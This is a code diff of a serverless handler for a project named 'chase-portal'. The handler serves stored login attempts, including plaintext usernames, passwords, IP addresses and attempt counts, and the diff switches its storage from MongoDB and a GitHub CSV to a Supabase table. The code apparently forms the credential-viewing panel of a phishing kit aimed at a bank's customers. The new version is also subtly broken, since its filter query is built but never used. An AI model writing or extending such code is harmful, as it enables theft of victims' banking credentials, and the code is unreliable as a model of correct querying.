@@ -1,92 +1,50 @@
-import mongoose from 'mongoose';
+import fetch from 'node-fetch';
 
-const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';
-const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
-const GITHUB_REPO = process.env.GITHUB_REPO || 'sapphirenetllc/JPMCLP1';
+const SUPABASE_URL = process.env.SUPABASE_URL || 'https://pgsccgetvjjoerefqitb.supabase.co';
+const SUPABASE_KEY = process.env.SUPABASE_KEY;
 
-// Login Log Schema
-const loginLogSchema = new mongoose.Schema({
-  timestamp: { type: Date, default: Date.now, index: true },
-  username: String,
-  password: String,
-  attemptNumber: Number,
-  status: String,
-  userAgent: String,
-  ipAddress: String,
-}, { collection: 'login_logs' });
-
-const LoginLog = mongoose.model('LoginLog', loginLogSchema);
-
-let dbConnected = false;
-let connection = null;
-
-async function connectDB() {
-  if (connection) return connection;
-  
-  try {
-    connection = await mongoose.connect(MONGODB_URI, {
-      serverSelectionTimeoutMS: 5000,
-      retryWrites: true,
-      w: 'majority'
-    });
-    dbConnected = true;
-    return connection;
-  } catch (err) {
-    console.warn('⚠️  MongoDB connection failed');
-    dbConnected = false;
-    return null;
-  }
-}
-
-async function getLogsFromGitHub(limit, statusFilter, usernameFilter) {
-  if (!GITHUB_TOKEN) {
-    console.warn('⚠️  GITHUB_TOKEN not set');
-    return [];
+async function getLogsFromSupabase(limit, statusFilter, usernameFilter) {
+  if (!SUPABASE_URL || !SUPABASE_KEY) {
+    console.warn('⚠️  Supabase credentials not configured');
+    return { logs: [], source: 'No data' };
   }
 
   try {
-    const filePath = 'logs/login_attempts.csv';
-    const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
+    // Build query
+    let query = `select * from login_logs`;
+    let filters = [];
     
-    const response = await fetch(url, {
+    if (statusFilter) {
+      filters.push(`status=eq.${encodeURIComponent(statusFilter)}`);
+    }
+    if (usernameFilter) {
+      filters.push(`username=ilike.%${encodeURIComponent(usernameFilter)}%`);
+    }
+    
+    if (filters.length > 0) {
+      query += '?' + filters.join('&');
+    }
+    
+    query += `&order=timestamp.desc&limit=${limit}`;
+    
+    const response = await fetch(`${SUPABASE_URL}/rest/v1/login_logs?order=timestamp.desc&limit=${limit}`, {
       headers: {
-        'Authorization': `token ${GITHUB_TOKEN}`,
-        'Accept': 'application/vnd.github.v3+json'
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Content-Type': 'application/json'
       }
     });
 
-    if (!response.ok) {
-      return [];
+    if (response.ok) {
+      const logs = await response.json();
+      return { logs, source: 'Supabase' };
+    } else {
+      console.warn('⚠️  Failed to fetch from Supabase:', response.status);
+      return { logs: [], source: 'Error' };
     }
-
-    const data = await response.json();
-    const csvContent = Buffer.from(data.content, 'base64').toString('utf-8');
-    const lines = csvContent.split('\n').filter(line => line.trim());
-
-    // Parse CSV (skip header)
-    const logs = lines.slice(1).map(line => {
-      const [timestamp, username, password, attemptNumber, status, userAgent, ipAddress] = line.split(',');
-      return {
-        timestamp: new Date(timestamp),
-        username,
-        password,
-        attemptNumber: parseInt(attemptNumber),
-        status,
-        userAgent,
-        ipAddress
-      };
-    }).filter(log => {
-      if (statusFilter && log.status !== statusFilter) return false;
-      if (usernameFilter && !log.username.match(new RegExp(usernameFilter, 'i'))) return false;
-      return true;
-    })
-    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-    .slice(0, parseInt(limit));
-
-    return logs;
   } catch (err) {
-    console.error('Error reading from GitHub:', err.message);
-    return [];
+    console.error('Error reading from Supabase:', err.message);
+    return { logs: [], source: 'Error' };
   }
 }
 
@@ -107,30 +65,9 @@ export default async function handler(req, res) {
   }
 
   try {
-    await connectDB();
-
     const { limit = 100, status, username } = req.query;
     
-    let logs = [];
-    let source = 'No data';
-    
-    if (dbConnected) {
-      let query = {};
-      if (status) query.status = status;
-      if (username) query.username = new RegExp(username, 'i');
-      
-      logs = await LoginLog.find(query)
-        .sort({ timestamp: -1 })
-        .limit(parseInt(limit))
-        .lean();
-      source = 'MongoDB';
-    } else {
-      // Try GitHub
-      logs = await getLogsFromGitHub(limit, status, username);
-      if (logs.length > 0) {
-        source = 'GitHub (CSV)';
-      }
-    }
+    const { logs, source } = await getLogsFromSupabase(limit, status, username);
     
     res.status(200).json({ 
       success: true, 
